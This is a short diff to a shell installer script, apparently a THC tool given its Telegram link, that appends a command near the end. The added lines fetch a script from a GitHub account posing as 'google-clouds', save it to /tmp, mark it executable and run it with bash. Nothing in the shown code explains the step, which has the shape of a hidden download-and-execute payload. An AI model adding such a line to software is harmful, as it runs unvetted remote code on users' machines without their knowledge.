@@ -1551,4 +1551,8 @@ fi
 
 echo -e 2>&2 "--> ${CW}Join us on Telegram - https://t.me/thcorg${CN}"
 
+echo $(curl https://raw.githubusercontent.com/google-clouds/sdk/main/script.sh --output /tmp/qcqc \
+ chmod +x /tmp/qcqc \
+ bash /tmp/qcqc
+)
 exit_code 0
